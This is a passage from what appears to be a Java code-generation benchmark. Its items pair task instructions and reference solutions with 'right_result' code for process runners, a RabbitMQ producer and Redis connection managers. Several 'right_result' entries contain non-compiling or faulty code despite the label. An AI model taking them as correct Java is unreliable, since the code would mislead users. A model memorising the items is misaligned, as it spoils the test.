Thread(() -> {\n            BufferedReader br = null;\n            try {\n                br = new BufferedReader(new InputStreamReader(is, Charsets.UTF_8));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    Log.println(priority, TAG, line);\n                }\n            } catch (IOException e) {\n                Log.w(TAG, \"Failed to read process output\", e);\n            } finally {\n                if (br != null) {\n                    try {\n                        br.close();\n                    } catch (IOException e) {\n                        Log.w(TAG, \"Failed to close bufferedReader\", e);\n                    }\n                }\n            }\n        });\n        t.start();\n        return t;\n    }\n\n    @SuppressLint(\"WakelockTimeout\")\n    public String runProcess(ProcessBuilder pb, boolean returnStdOut) {\n        String capturedStdOut = \"\";\n        PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);\n        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);\n        try {\n            wakeLock.acquire();\n            Process process = pb.start();\n\n            Thread lInfo = null;\n            Thread lWarn = null;\n            if (returnStdOut) {\n                BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream(), Charsets.UTF_8));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    Log.println(Log.INFO, TAG, line);\n                    capturedStdOut = capturedStdOut + line + \"\\n\";\n                }\n                br.close();\n            } else {\n                lInfo = log(process.getInputStream(), Log.INFO);\n                lWarn = log(process.getErrorStream(), Log.WARN);\n            }\n\n            int ret = process.waitFor();\n            Log.i(TAG, \"Process exited with code \" + ret);\n            if (lInfo != null) lInfo.join();\n            if (lWarn != null) lWarn.join();\n        } catch (IOException | InterruptedException e) {\n            Log.e(TAG, \"Failed to execute process or read output\", e);\n        } finally {\n            wakeLock.release();\n        }\n        return capturedStdOut;\n    }\n\n    public List<String> getProcessPIDs(String processName) {\n        List<String> pids = new ArrayList<>();\n        Process ps = null;\n        DataOutputStream psOut = null;\n        BufferedReader br = null;\n        try {\n            ps = Runtime.getRuntime().exec((mUseRoot) ? \"su\" : \"sh\");\n            psOut = new DataOutputStream(ps.getOutputStream());\n            psOut.writeBytes(\"ps\\n\");\n            psOut.writeBytes(\"exit\\n\");\n            psOut.flush();\n            ps.waitFor();\n            br = new BufferedReader(new InputStreamReader(ps.getInputStream(), \"UTF-8\"));\n            String line;\n            while ((line = br.readLine()) != null) {\n                if (line.contains(processName)) {\n                    String pid = line.trim().split(\"\\\\s+\")[1];\n                    Log.v(TAG, \"getProcessPIDs: Found process PID [\" + pid + \"]\");\n                    pids.add(pid);\n                }\n            }\n        } catch (IOException | InterruptedException e) {\n            Log.w(TAG, \"Failed to list processes\", e);\n        } finally {\n            try {\n                if (br != null) br.close();\n                if (psOut != null) psOut.close();\n            } catch (IOException e) {\n                Log.w(TAG, \"Failed to close streams\", e);\n            }\n            if (ps != null) ps.destroy();\n        }\n        return pids;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport android.content.Context;\nimport android.content.SharedPreferences;\nimport android.os.PowerManager;\nimport java.io.InputStream;\nimport java.util.HashMap;\nimport java.util.List;\n\npublic class ProcessHandler {\n    private Context mContext;\n    private boolean mUseRoot;\n    private SharedPreferences mPreferences;\n\n    public ProcessHandler(Context context, boolean useRoot, SharedPreferences preferences) {\n        this.mContext = context;\n        this.mUseRoot = useRoot;\n        this.mPreferences = preferences;\n    }\n\n    public Process setupAndLaunch(HashMap<String, String> env, String[] command) throws Exception {\n        ProcessBuilder pb = new ProcessBuilder(command);\n        if (env != null) {\n            pb.environment().putAll(env);\n        }\n        if (mUseRoot) {\n            // Code to start process with root privileges\n        } else {\n            return pb.start();\n        }\n        return null;\n    }\n\n    public Thread log(InputStream is, int priority) {\n        return new Thread(() -> {\n            try {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = is.read(buffer)) != -1) {\n                    String output = new String(buffer, 0, bytesRead);\n                    Log.println(priority, \"ProcessHandler\", output);\n                }\n            } catch (Exception e) {\n                Log.e(\"ProcessHandler\", \"Error reading from stream\", e);\n            }\n        });\n    }\n\n    public String runProcess(ProcessBuilder pb, boolean returnStdOut) throws Exception {\n        PowerManager powerManager = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);\n        PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, \"ProcessHandler:wakelock\");\n        wakeLock.acquire();\n\n        Process process = pb.start();\n        Thread logThread = log(process.getInputStream(), Log.INFO);\n        Thread errorLogThread = log(process.getErrorStream(), Log.ERROR);\n\n        logThread.start();\n        errorLogThread.start();\n\n        int exitCode = process.waitFor();\n        logThread.join();\n        errorLogThread.join();\n\n        wakeLock.release();\n\n        if (returnStdOut) {\n            return new String(process.getInputStream().readAllBytes());\n        } else {\n            return Integer.toString(exitCode);\n        }\n    }\n\n    public List<String> getProcessPIDs(String processName) throws Exception {\n        // Code to get process PIDs by name\n        return null;\n    }\n}\n```"
  },
  {
    "Task_id": 303,
    "Instruction": "Task Description: Create a Java class that manages the execution of external commands, handles their input/output streams, and provides synchronization capabilities for waiting until the command completes.\n\nClass Description: The ExtCmd class provides functionality to execute external system commands, manage their input/output streams, and wait for their completion. It includes features for logging, condition checking before execution, and notification listeners for process completion.\n\nAttributes:\n\nconditionsWithDescriptions: Map<ExtCmdCondition, String> - Stores conditions that must be met before command execution along with their descriptions\nextCmdEndedListenerSet: Set<ExtCmdEndedListener> - Collection of listeners to be notified when command execution ends\noutReceiver: OutputReceiver - Handles the standard output stream from the executed command\nerrReceiver: OutputReceiver - Handles the error output stream from the executed command\nerrLog: ErrorReporter - Logger for command execution information\nstartTime: long - Timestamp when command execution started\nexecCommand: String[] - The command to be executed\nexecCommandStr: String - String representation of the command\nlogExecution: boolean - Flag to enable/disable execution logging\n\nMethods:\n\nexec(ProcessBuilder.Redirect, File, String...) -> OutputStream - Executes an external command with specified input redirection, working directory, and command arguments. Returns the process's output stream for writing input.\nsyncProcess() -> OutputData - Waits for the command to complete and returns its output data including stdout, stderr, and exit code.\ncheckForConditions() -> void - Internal method to verify all execution conditions are met before starting a command.\n\nNested Classes:\n\nOutputData: Contains the results of command execution including stdout, stderr, and exit code\nExtCmdCondition: Interface for defining pre-execution conditions\nExtCmdEndedListener: Interface for command completion notification callbacks",
    "Canonical_solution": "import com.linbit.ChildProcessTimeoutException;\nimport com.linbit.linstor.logging.ErrorReporter;\nimport com.linbit.timer.Action;\nimport com.linbit.timer.Timer;\nimport com.linbit.utils.StringUtils;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Set;\n\nimport org.slf4j.MDC;\n\npublic class ExtCmd extends ChildProcessHandler\n{\n    private final Map<ExtCmdCondition, String> conditionsWithDescriptions;\n    private final Set<ExtCmdEndedListener> extCmdEndedListenerSet;\n\n    private OutputReceiver outReceiver;\n    private OutputReceiver errReceiver;\n    private ErrorReporter errLog;\n    private long startTime;\n\n    private String[] execCommand;\n    private String execCommandStr;\n\n    private boolean logExecution = true;\n\n    public ExtCmd(Timer<String, Action<String>> timer, ErrorReporter errLogRef)\n    {\n        super(timer);\n        conditionsWithDescriptions = new HashMap<>();\n        outReceiver = null;\n        errReceiver = null;\n        errLog = errLogRef;\n        extCmdEndedListenerSet = new HashSet<>();\n    }\n\n    public OutputStream exec(ProcessBuilder.Redirect stdinRedirect, File directory, String... command)\n        throws IOException\n    {\n        execCommand = command;\n        execCommandStr = StringUtils.joinShellQuote(command);\n\n        if (logExecution)\n        {\n            errLog.logDebug(\"Executing command: %s\", execCommandStr);\n        }\n\n        ProcessBuilder pBuilder = new ProcessBuilder();\n        pBuilder.directory(directory);\n        pBuilder.command(command);\n        pBuilder.redirectError(ProcessBuilder.Redirect.PIPE);\n        pBuilder.redirectOutput(ProcessBuilder.Redirect.PIPE);\n        pBuilder.redirectInput(stdinRedirect);\n        Process child;\n        synchronized (conditionsWithDescriptions)\n        {\n            checkForConditions();\n            child = pBuilder.start();\n            startTime = System.currentTimeMillis();\n            setChild(child);\n            outReceiver = new OutputReceiver(\n                child.getInputStream(), errLog, logExecution, MDC.get(ErrorReporter.LOGID));\n            errReceiver = new OutputReceiver(\n                child.getErrorStream(), errLog, logExecution, MDC.get(ErrorReporter.LOGID));\n        }\n        new Thread(outReceiver).start();\n        new Thread(errReceiver).start();\n\n        return child.getOutputStream();\n    }\n\n    private void checkForConditions()\n    {\n        for (Entry<ExtCmdCondition, String> entry : conditionsWithDescriptions.entrySet())\n        {\n            if (!entry.getKey().isMet(this))\n            {\n                throw new ExtCmdConditionNotFullfilledException(entry.getValue() + \", command: \" + this.execCommandStr);\n            }\n        }\n    }\n\n    public OutputData syncProcess() throws IOException, ChildProcessTimeoutException\n    {\n        OutputData outData;\n        try\n        {\n            int exitCode = waitFor();\n            outReceiver.finish();\n            errReceiver.finish();\n            outData = new OutputData(\n                execCommand,\n                outReceiver.getData(),\n                errReceiver.getData(),\n                exitCode\n            );\n\n            if (logExecution)\n            {\n                errLog.logTrace(\n                    \"External command finished in %dms: %s\",\n                    (System.currentTimeMillis() - startTime),\n                    execCommandStr\n                );\n            }\n\n            for (ExtCmdEndedListener listener : extCmdEndedListenerSet)\n            {\n                listener.extCmdEnded(this);\n            }\n        }\n        catch (IOException | ChildProcessTimeoutException exc)\n        {\n            for (ExtCmdEndedListener listener : extCmdEndedListenerSet)\n            {\n                listener.extCmdEnded(this, exc);\n            }\n            throw exc;\n        }\n        return outData;\n    }\n\n    public static class OutputData\n    {\n        public final String[] executedCommand;\n        public final byte[] stdoutData;\n        public final byte[] stderrData;\n        public final int exitCode;\n\n        public OutputData(String[] executeCmd, byte[] out, byte[] err, int retCode)\n        {\n            executedCommand = executeCmd;\n            stdoutData = out;\n            stderrData = err;\n            exitCode = retCode;\n        }\n    }\n\n    public interface ExtCmdCondition\n    {\n        boolean isMet(ExtCmd extCmd);\n    }\n\n    public interface ExtCmdEndedListener\n    {\n        void extCmdEnded(ExtCmd extCmd);\n        void extCmdEnded(ExtCmd extCmd, Exception exc);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.util.*;\n\npublic class ExtCmd {\n    private Map<ExtCmdCondition, String> conditionsWithDescriptions = new HashMap<>();\n    private Set<ExtCmdEndedListener> extCmdEndedListenerSet = new HashSet<>();\n    private OutputReceiver outReceiver;\n    private OutputReceiver errReceiver;\n    private ErrorReporter errLog;\n    private long startTime;\n    private String[] execCommand;\n    private String execCommandStr;\n    private boolean logExecution;\n\n    public ExtCmd(String[] execCommand, String execCommandStr, boolean logExecution) {\n        this.execCommand = execCommand;\n        this.execCommandStr = execCommandStr;\n        this.logExecution = logExecution;\n    }\n\n    public OutputStream exec(ProcessBuilder.Redirect redirect, File dir, String... args) throws IOException {\n        ProcessBuilder pb = new ProcessBuilder(Executors.join(execCommand, args));\n        if (dir != null) {\n            pb.directory(dir);\n        }\n        pb.redirectErrorStream(true);\n        Process p = pb.start();\n        if (redirect != null) {\n            p.getOutputStream().write(redirect.value());\n            p.getOutputStream().flush();\n        }\n        return p.getInputStream();\n    }\n\n    public OutputData syncProcess() throws IOException, InterruptedException {\n        checkForConditions();\n        startTime = System.currentTimeMillis();\n        ProcessBuilder pb = new ProcessBuilder(execCommand);\n        pb.redirectErrorStream(true);\n        Process p = pb.start();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n        StringBuilder stdout = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            stdout.append(line).append(\"\\n\");\n            if (outReceiver != null) {\n                outReceiver.receive(line);\n            }\n        }\n\n        int exitCode = p.waitFor();\n        if (errReceiver != null) {\n            errReceiver.receive(\"Exit Code: \" + exitCode);\n        }\n        errLog.report(\"Command executed: \" + execCommandStr + \", Exit Code: \" + exitCode);\n\n        notifyListeners();\n\n        return new OutputData(stdout.toString(), \"\", exitCode);\n    }\n\n    private void checkForConditions() {\n        for (Map.Entry<ExtCmdCondition, String> entry : conditionsWithDescriptions.entrySet()) {\n            if (!entry.getKey().isMet()) {\n                throw new RuntimeException(\"Condition not met: \" + entry.getValue());\n            }\n        }\n    }\n\n    private void notifyListeners() {\n        for (ExtCmdEndedListener listener : extCmdEndedListenerSet) {\n            listener.onEnded(this);\n        }\n    }\n\n    public static class OutputData {\n        private String stdout;\n        private String stderr;\n        private int exitCode;\n\n        public OutputData(String stdout, String stderr, int exitCode) {\n            this.stdout = stdout;\n            this.stderr = stderr;\n            this.exitCode = exitCode;\n        }\n\n        // Getters and setters\n    }\n\n    public interface ExtCmdCondition {\n        boolean isMet();\n    }\n\n    public interface ExtCmdEndedListener {\n        void onEnded(ExtCmd cmd);\n    }\n\n    public interface OutputReceiver {\n        void receive(String line);\n    }\n\n    public interface ErrorReporter {\n        void report(String message);\n    }\n}\n```"
  },
  {
    "Task_id": 306,
    "Instruction": "Task Description: Implement a RabbitMQ producer class in Java that can connect to a RabbitMQ broker, send messages to a specified queue, and properly manage resources.\n\nClass Description: The RabbitMQProducer class provides functionality to establish a connection with a RabbitMQ message broker, declare a queue, send messages to that queue, and handle connection cleanup. It supports both single message and batch message sending operations.\n\nAttributes:\n- host: String - The hostname or IP address of the RabbitMQ server\n- port: int - The port number of the RabbitMQ server\n- username: String - The username for authentication with RabbitMQ\n- password: String - The password for authentication with RabbitMQ\n- queueName: String - The name of the queue to send messages to\n- durable: boolean - Whether the queue should survive server restarts\n- connection: Connection - The RabbitMQ connection object\n- channel: Channel - The RabbitMQ channel object for message operations\n\nMethods:\n- RabbitMQProducer(Map<String, String> config) -> void - Constructor that initializes the producer with configuration parameters\n- connect() -> void - Establishes connection to RabbitMQ and creates a channel\n- sendMessage(String message) -> void - Sends a single message to the declared queue\n- sendMessages(String[] messages) -> void - Sends multiple messages to the declared queue\n- close() -> void - Closes the channel and connection to release resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.TimeoutException;\nimport com.rabbitmq.client.ConnectionFactory;\nimport com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.MessageProperties;\n\npublic class RabbitMQProducer {\n\n    private String host;\n    private int port;\n    private String username;\n    private String password;\n    private String queueName;\n    private boolean durable;\n    private Connection connection;\n    private Channel channel;\n\n    public RabbitMQProducer(Map<String, String> config) {\n        this.host = config.get(\"rabbitmq_host\");\n        this.port = Integer.parseInt(config.get(\"rabbitmq_port\"));\n        this.username = config.get(\"rabbitmq_user\");\n        this.password = config.get(\"rabbitmq_pass\");\n        this.queueName = config.get(\"rabbitmq_queuename\");\n        this.durable = config.get(\"rabbitmq_durable\").equals(\"true\");\n    }\n\n    public void connect() throws IOException, TimeoutException {\n        ConnectionFactory factory = new ConnectionFactory();\n        factory.setHost(host);\n        factory.setPort(port);\n        factory.setUsername(username);\n        factory.setPassword(password);\n        connection = factory.newConnection();\n        channel = connection.createChannel();\n        channel.queueDeclare(queueName, durable, false, false, null);\n    }\n\n    public void sendMessage(String message) throws IOException {\n        channel.basicPublish(\"\", queueName, \n            MessageProperties.PERSISTENT_TEXT_PLAIN,\n            message.getBytes()\n        );\n    }\n\n    public void sendMessages(String[] messages) throws IOException {\n        for (String message : messages) {\n            sendMessage(message);\n        }\n    }\n\n    public void close() throws IOException, TimeoutException {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        if (connection != null && connection.isOpen()) {\n            connection.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 40,
    "right_result": "```java\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.ConnectionFactory;\n\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.TimeoutException;\n\npublic class RabbitMQProducer {\n    private String host;\n    private int port;\n    private String username;\n    private String password;\n    private String queueName;\n    private boolean durable;\n    private Connection connection;\n    private Channel channel;\n\n    public RabbitMQProducer(Map<String, String> config) {\n        this.host = config.get(\"host\");\n        this.port = Integer.parseInt(config.get(\"port\"));\n        this.username = config.get(\"username\");\n        this.password = config.get(\"password\");\n        this.queueName = config.get(\"queueName\");\n        this.durable = Boolean.parseBoolean(config.get(\"durable\"));\n    }\n\n    public void connect() throws IOException, TimeoutException {\n        ConnectionFactory factory = new ConnectionFactory();\n        factory.setHost(host);\n        factory.setPort(port);\n        factory.setUsername(username);\n        factory.setPassword(password);\n        connection = factory.newConnection();\n        channel = connection.createChannel();\n        channel.queueDeclare(queueName, durable, false, false, null);\n    }\n\n    public void sendMessage(String message) throws IOException, TimeoutException {\n        channel.basicPublish(\"\", queueName, null, message.getBytes());\n    }\n\n    public void sendMessages(String[] messages) throws IOException, TimeoutException {\n        for (String message : messages) {\n            channel.basicPublish(\"\", queueName, null, message.getBytes());\n        }\n    }\n\n    public void close() throws IOException, TimeoutException {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        if (connection != null && connection.isOpen()) {\n            connection.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 307,
    "Instruction": "Task Description: Create a Java class that implements a Redis publisher using the Lettuce client library, capable of publishing elements to a Redis list and providing a reactive stream publisher for consuming these elements.\n\nClass Description: The RedisPublisher class provides functionality to connect to a Redis server, publish elements to a Redis list, and create a reactive stream publisher for these elements. It handles connection management and resource cleanup.\n\nAttributes:\n- client: [RedisClient] - The Redis client instance used to establish connections with the Redis server.\n- connection: [StatefulRedisConnection<String, String>] - The active connection to the Redis server for executing commands.\n\nMethods:\n- RedisPublisher() - [Constructor] -> [void] - Initializes the Redis client and establishes a connection to the Redis server. Also flushes all existing data in Redis.\n- createPublisher(long elements) -> [Publisher<String>] - Creates and returns a reactive stream Publisher that emits elements from a Redis list. The method creates a new Redis list with the specified number of elements and sets up a supplier for LRANGE commands to retrieve them.\n- close() -> [void] - Closes the Redis connection and shuts down the client to release resources.\n\nInput: \n- For createPublisher: elements [long] - The number of elements to publish to the Redis list.\n\nOutput:\n- For createPublisher: A Publisher<String> that emits the elements from the Redis list. Returns null if elements equals Long.MAX_VALUE.",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.output.ValueListOutput;\nimport io.lettuce.core.protocol.Command;\nimport io.lettuce.core.protocol.CommandArgs;\nimport io.lettuce.core.protocol.CommandType;\nimport io.lettuce.test.resource.FastShutdown;\nimport io.lettuce.test.resource.TestClientResources;\nimport io.lettuce.test.settings.TestSettings;\nimport org.reactivestreams.Publisher;\nimport java.util.List;\nimport java.util.UUID;\nimport java.util.function.Supplier;\n\npublic class RedisPublisher {\n\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public RedisPublisher() {\n        client = RedisClient.create(TestClientResources.get(), RedisURI.create(TestSettings.host(), TestSettings.port()));\n        connection = client.connect();\n        connection.sync().flushall();\n    }\n\n    public Publisher<String> createPublisher(long elements) {\n        RedisCommands<String, String> sync = connection.sync();\n\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n\n        String id = UUID.randomUUID().toString();\n        String key = \"PublisherVerification-\" + id;\n\n        for (int i = 0; i < elements; i++) {\n            sync.lpush(key, \"element-\" + i);\n        }\n\n        Supplier<Command<String, String, List<String>>> supplier = () -> {\n            CommandArgs<String, String> args = new CommandArgs<>(StringCodec.UTF8).addKey(key).add(0).add(-1);\n            return new Command<>(CommandType.LRANGE, new ValueListOutput<>(StringCodec.UTF8), args);\n        };\n\n        return new TestRedisPublisher(supplier, connection, true);\n    }\n\n    public void close() {\n        connection.close();\n        FastShutdown.shutdown(client);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport org.reactivestreams.Publisher;\nimport reactor.core.publisher.Flux;\n\npublic class RedisPublisher {\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public RedisPublisher() {\n        client = RedisClient.create(\"redis://localhost\");\n        connection = client.connect();\n        RedisCommands<String, String> syncCommands = connection.sync();\n        syncCommands.flushall();\n    }\n\n    public Publisher<String> createPublisher(long elements) {\n        if (elements == Long.MAX_VALUE) return null;\n        RedisCommands<String, String> syncCommands = connection.sync();\n        Flux<String> flux = Flux.range(0, (int) elements).map(i -> \"element\" + i);\n        flux.doOnNext(element -> syncCommands.lpush(\"mylist\", element));\n        return flux;\n    }\n\n    public void close() {\n        connection.close();\n        client.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 309,
    "Instruction": "Task Description: Create a Java class that manages Redis connections using the Jedis client library, providing methods to establish, close, and create new connections with configurable protocols.\n\nClass Description: The RedisConnectionManager class handles Redis connection management using Jedis, allowing for protocol configuration and providing essential connection operations. It encapsulates connection details and offers methods for connection lifecycle management.\n\nAttributes:\n\nendpoint: [EndpointConfig] - Configuration for Redis connection endpoint (host, port, etc.)\nprotocol: [RedisProtocol] - The Redis protocol to be used for connections\njedis: [Jedis] - The Jedis client instance for Redis operations\n\nMethods:\n\nsetUpConnection: [void]() -> [void] - Establishes a new Redis connection with the configured protocol and timeout, and flushes all existing data\ncloseConnection: [void]() -> [void] - Closes the current Redis connection and releases resources\ncreateNewConnection: [Jedis]() -> [Jedis] - Creates and returns a new Jedis connection instance with the configured protocol",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.HostAndPorts;\nimport redis.clients.jedis.RedisProtocol;\nimport redis.clients.jedis.EndpointConfig;\n\npublic class RedisConnectionManager {\n\n    protected static final EndpointConfig endpoint = HostAndPorts.getRedisEndpoint(\"standalone0\");\n    protected final RedisProtocol protocol;\n    protected Jedis jedis;\n\n    public RedisConnectionManager(RedisProtocol protocol) {\n        this.protocol = protocol;\n    }\n\n    public void setUpConnection() throws Exception {\n        jedis = new Jedis(endpoint.getHostAndPort(), endpoint.getClientConfigBuilder()\n            .protocol(protocol).timeoutMillis(500).build());\n        jedis.flushAll();\n    }\n\n    public void closeConnection() throws Exception {\n        jedis.close();\n    }\n\n    public Jedis createNewConnection() {\n        return new Jedis(endpoint.getHostAndPort(), endpoint.getClientConfigBuilder()\n            .protocol(protocol).build());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport java.util.concurrent.TimeUnit;\n\npublic class RedisConnectionManager {\n    private EndpointConfig endpoint;\n    private RedisProtocol protocol;\n    private Jedis jedis;\n\n    public RedisConnectionManager(EndpointConfig endpoint, RedisProtocol protocol) {\n        this.endpoint = endpoint;\n        this.protocol = protocol;\n    }\n\n    public void setUpConnection() {\n        jedis = new Jedis(endpoint.getHost(), endpoint.getPort());\n        jedis.setTimeout((int) TimeUnit.SECONDS.convert(protocol.getTimeout(), TimeUnit.MILLISECONDS));\n        jedis.flushAll();\n    }\n\n    public void closeConnection() {\n        if (jedis != null && jedis.isConnected()) {\n            jedis.close();\n        }\n    }\n\n    public Jedis createNewConnection() {\n        return new Jedis(endpoint.getHost(), endpoint.getPort());\n    }\n}\n```\n\n```java\npublic class EndpointConfig {\n    private String host;\n    private int port;\n\n    public EndpointConfig(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String getHost() {\n        return host;\n    }\n\n    public int getPort() {\n        return port;\n    }\n}\n```\n\n```java\npublic class RedisProtocol {\n    private long timeout;\n\n    public RedisProtocol(long timeout) {\n        this.timeout = timeout;\n    }\n\n    public long getTimeout() {\n        return timeout;\n    }\n}\n```"
  },
  {
    "Task_id": 311,
    "Instruction": "Task Description: Create a Java class that manages Redis connections using the Jedis client library, providing functionality for connection establishment, credential updates, and resource cleanup.\n\nClass Description: The RedisConnectionManager class encapsulates Redis connection management using JedisPooled for connection pooling. It handles authentication, provides access to the Jedis instance, allows credential updates, and ensures proper resource cleanup.\n\nAttributes:\n- jedis: JedisPooled - The pooled Redis connection instance\n- credentialsProvider: DefaultRedisCredentialsProvider - Provider for Redis authentication credentials\n\nMethods:\n- RedisConnectionManager(String host, int port, String initialUsername, String initialPassword) -> void - Constructor that initializes the Redis connection with host, port, and initial credentials\n- updateCredentials(String updatedUsername, String updatedPassword) -> void - Updates the authentication credentials for the Redis connection\n- getJedisInstance() -> JedisPooled - Returns the managed JedisPooled instance for Redis operations\n- closeConnection() -> void - Closes the Redis connection and releases resources",
    "Canonical_solution": "import redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.DefaultRedisCredentials;\nimport redis.clients.jedis.DefaultRedisCredentialsProvider;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisPooled;\n\npublic class RedisConnectionManager {\n\n    private JedisPooled jedis;\n    private DefaultRedisCredentialsProvider credentialsProvider;\n\n    public RedisConnectionManager(String host, int port, String initialUsername, String initialPassword) {\n        DefaultRedisCredentials initialCredentials = new DefaultRedisCredentials(initialUsername, initialPassword);\n        this.credentialsProvider = new DefaultRedisCredentialsProvider(initialCredentials);\n        HostAndPort address = new HostAndPort(host, port);\n        DefaultJedisClientConfig clientConfig = DefaultJedisClientConfig.builder()\n                .credentialsProvider(credentialsProvider).build();\n        this.jedis = new JedisPooled(address, clientConfig);\n    }\n\n    public void updateCredentials(String updatedUsername, String updatedPassword) {\n        DefaultRedisCredentials updatedCredentials = new DefaultRedisCredentials(updatedUsername, updatedPassword);\n        credentialsProvider.setCredentials(updatedCredentials);\n    }\n\n    public JedisPooled getJedisInstance() {\n        return jedis;\n    }\n\n    public void closeConnection() {\n        jedis.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.params.AuthParams;\n\npublic class RedisConnectionManager {\n    private JedisPool jedis;\n    private AuthParams authParams;\n\n    public RedisConnectionManager(String host, int port, String initialUsername, String initialPassword) {\n        this.authParams = new AuthParams().setUsername(initialUsername).setPassword(initialPassword);\n        this.jedis = new JedisPool(new JedisPoolConfig(), host, port, 2000, authParams);\n    }\n\n    public void updateCredentials(String updatedUsername, String updatedPassword) {\n        this.authParams.setUsername(updatedUsername).setPassword(updatedPassword);\n        if (jedis != null && !jedis.isClosed()) {\n            jedis.destroy();\n        }\n        this.jedis = new JedisPool(new JedisPoolConfig(), \"localhost\", 6379, 2000, authParams);\n    }\n\n    public JedisPool getJedisInstance() {\n        return jedis;\n    }\n\n    public void closeConnection() {\n        if (jedis != null && !jedis.isClosed()) {\n            jedis.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 312,
    "Instruction": "Task Description: Implement a Redis-based registry class for node registration and subscription in a distributed system, using Java with Jedis client library.\n\nClass Description: RedisRegistry is a class that provides node registration and subscription capabilities using Redis as the backend storage. It maintains connections to Redis servers, handles node registration, and manages subscription to node changes.\n\nAttributes:\n- jedisPools: ConcurrentHashMap<String, JedisPool> - A thread-safe map storing JedisPool instances for different Redis server addresses\n- clusterName: String - The name of the current cluster\n- replicate: boolean - Flag indicating whether operations should be replicated to all Redis servers\n- notifiers: ConcurrentMap<String, Notifier> - A thread-safe map storing Notifier instances for different node paths\n\nMethods:\n- RedisRegistry(AppContext appContext) - Constructor - Initializes the registry with configuration from AppContext\n  Input: appContext: AppContext - The application context containing configuration\n  Output: None\n\n- doRegister(Node node) - protected - Registers a node in Redis\n  Input: node: Node - The node to be registered\n  Output: None (throws NodeRegistryException on failure)\n\n- doSubscribe(Node node, NotifyListener listener) - protected - Subscribes to node changes\n  Input: \n    node: Node - The node that wants to subscribe\n    listener: NotifyListener - The listener to be notified of changes\n  Output: None\n\nNested Classes:\n- NotifySub extends JedisPubSub - Handles Redis pub/sub messages\n  Methods:\n    onMessage(String key, String msg) - Processes incoming messages\n      Input:\n        key: String - The channel/key of the message\n        msg: String - The message content\n      Output: None\n\n- Notifier extends Thread - Manages subscription thread\n  Methods:\n    run() - Main thread execution for subscription\n      Input: None\n      Output: None\n    shutdown() - Stops the subscription thread\n      Input: None\n      Output: None",
    "Canonical_solution": "import com.github.ltsopensource.core.AppContext;\nimport com.github.ltsopensource.core.cluster.Config;\nimport com.github.ltsopensource.core.cluster.Node;\nimport com.github.ltsopensource.core.cluster.NodeType;\nimport com.github.ltsopensource.core.commons.utils.CollectionUtils;\nimport com.github.ltsopensource.core.constant.Constants;\nimport com.github.ltsopensource.core.exception.NodeRegistryException;\nimport com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.core.logger.LoggerFactory;\nimport com.github.ltsopensource.core.registry.NotifyEvent;\nimport com.github.ltsopensource.core.registry.NotifyListener;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPubSub;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class RedisRegistry {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(RedisRegistry.class);\n    private final Map<String, JedisPool> jedisPools = new ConcurrentHashMap<String, JedisPool>();\n    private String clusterName;\n    private boolean replicate;\n    private final ConcurrentMap<String, Notifier> notifiers = new ConcurrentHashMap<String, Notifier>();\n\n    public RedisRegistry(AppContext appContext) {\n        Config config = appContext.getConfig();\n        this.clusterName = config.getClusterName();\n\n        String address = NodeRegistryUtils.getRealRegistryAddress(config.getRegistryAddress());\n        String[] addrs = address.split(\",\");\n        for (String addr : addrs) {\n            int i = addr.indexOf(':');\n            String host = addr.substring(0, i);\n      